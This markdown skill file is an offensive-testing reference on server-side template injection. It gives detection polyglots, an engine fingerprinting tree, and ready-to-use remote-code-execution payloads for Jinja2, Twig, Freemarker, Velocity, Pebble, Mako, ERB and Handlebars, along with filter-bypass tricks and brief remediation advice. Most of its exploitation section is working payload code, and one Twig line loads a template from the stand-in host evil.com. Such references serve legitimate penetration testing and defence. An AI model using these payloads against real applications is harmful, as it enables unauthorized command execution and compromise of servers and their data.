---
name: ssti
description: Server-Side Template Injection testing covering Jinja2, Twig, Freemarker, Velocity, Pebble, Mako, ERB, and Handlebars with sandbox escape and RCE techniques
mitre_techniques: [T1221, T1059]
kill_chain_phases: [execution, initial_access]
---

# SSTI

Server-Side Template Injection occurs when user input is embedded into template source code rather than passed as data. Because template engines are designed to execute expressions, injection leads directly to information disclosure, sandbox escape, and remote code execution. The attack surface is broad: any framework rendering dynamic templates from user-controlled strings is at risk.

## Attack Surface

**Types**
- Direct injection into template source strings, partial templates, template names/paths
- Indirect injection via stored data rendered in templates (email, PDF, report generators)

**Contexts**
- Web frameworks (Flask, Django, Spring, Laravel, Rails, Express), CMS platforms, email templating, PDF/document generation, error pages, marketing/notification templates

**Frameworks**
- Python: Jinja2, Mako, Django Templates, Tornado
- PHP: Twig, Blade, Smarty
- Java: Freemarker, Velocity, Pebble, Thymeleaf
- Ruby: ERB, Slim, Haml
- JavaScript: Handlebars, Pug, Nunjucks, EJS

**Defenses to Bypass**
- Sandboxed template engines, restricted builtins, WAF keyword filters, input sanitization

## Detection

**Universal Polyglots**
Test with mathematical expressions that differ per engine:
- `{{7*7}}` — Jinja2, Twig, Handlebars, Nunjucks, Angular
- `${7*7}` — Freemarker, Velocity, Mako, Thymeleaf, EJS
- `#{7*7}` — Pebble, Ruby ERB interpolation, Thymeleaf
- `<%= 7*7 %>` — ERB, EJS
- `{7*7}` — Smarty, Velocity shorthand
- `{{7*'7'}}` — Jinja2 returns `7777777`, Twig returns `49` (engine fingerprinting)

**Decision Tree**
1. Inject `${7*7}` and `{{7*7}}` — check which evaluates
2. If `{{7*7}}` returns `49`: inject `{{7*'7'}}` — `7777777` means Jinja2, `49` means Twig
3. If `${7*7}` returns `49`: test `${class.getClass()}` for Freemarker vs Velocity
4. If `<%= %>` works: Ruby ERB or EJS depending on stack

## Exploitation by Engine

### Jinja2 (Python)

**Information Disclosure**
```
{{config}}
{{request.environ}}
{{self.__init__.__globals__}}
```

**RCE via MRO Chain**
```
{{''.__class__.__mro__[1].__subclasses__()}}
```
Find `subprocess.Popen` or `os._wrap_close` in the subclass list (index varies):
```
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}
```

**Sandbox Escape via Lipsum/Cycler**
```
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Twig (PHP)

**Information Disclosure**
```
{{app.request.server.all|join(',')}}
{{dump(app)}}
```

**RCE**
```
{{['id']|filter('system')}}
{{['id']|map('exec')}}
{{_self.env.setCache('ftp://evil.com')}}{{_self.env.loadTemplate('evil')}}
```

### Freemarker (Java)

**RCE via Built-in Execute**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${object.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
```

**Object Introspection**
```
${object.class.protectionDomain.codeSource.location}
```

### Velocity (Java)

**RCE**
```
#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())
$rt.exec("id")
```

**Alternative**
```
#set($proc=$runtime.exec("id"))
#set($is=$proc.getInputStream())
```

### Pebble (Java)

**RCE**
```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 'UTF-8') }}
```

### Mako (Python)

**RCE — Direct Python Execution**
```
<%import os;x=os.popen('id').read()%>${x}
${__import__('os').popen('id').read()}
```

### ERB (Ruby)

**RCE**
```
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

### Handlebars (JavaScript)

**Prototype Access**
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Bypass Techniques

- **Attribute/filter chaining**: use `|attr('__class__')` instead of dot access in Jinja2
- **String concatenation**: `{{'__cla'+'ss__'}}` to avoid keyword filters
- **Hex/octal encoding**: `\x5f\x5fclass\x5f\x5f` for underscore-blocked filters
- **Request object abuse**: `{{request.args.cmd}}` to pass payload via query param
- **Unicode normalization**: use fullwidth or homoglyph characters that normalize to blocked keywords

## Testing Methodology

1. **Identify template rendering** — look for reflected input in HTML that might pass through a template engine
2. **Inject detection probes** — use polyglot expressions across all major syntaxes
3. **Fingerprint engine** — differentiate engines using type coercion behavior
4. **Enumerate sandbox** — list accessible objects, builtins, globals
5. **Escalate to RCE** — chain through MRO, reflection, or direct execution primitives
6. **Verify blind SSTI** — use time-based or OAST callbacks when output is not reflected

## Indicators of Vulnerability

- Mathematical expressions evaluate and return results in responses
- Template syntax errors appear in error messages (engine name, stack trace)
- Access to internal objects (`config`, `request`, `self`, class hierarchies) via template expressions
- Blind: DNS/HTTP callback triggered from template-injected payload

## Remediation

- Never concatenate user input into template source; pass as template variables/context only
- Use logic-less templates (Mustache) where possible
- Enable and enforce sandbox modes; restrict accessible classes and methods
- Validate and sanitize input before it reaches template rendering
- Apply WAF rules as defense-in-depth, not primary protection

## Summary

SSTI converts template engines into code execution environments. The key distinction is whether user input becomes template source (vulnerable) or template data (safe). Fingerprint the engine, enumerate the sandbox, and chain to RCE through language-specific object traversal.
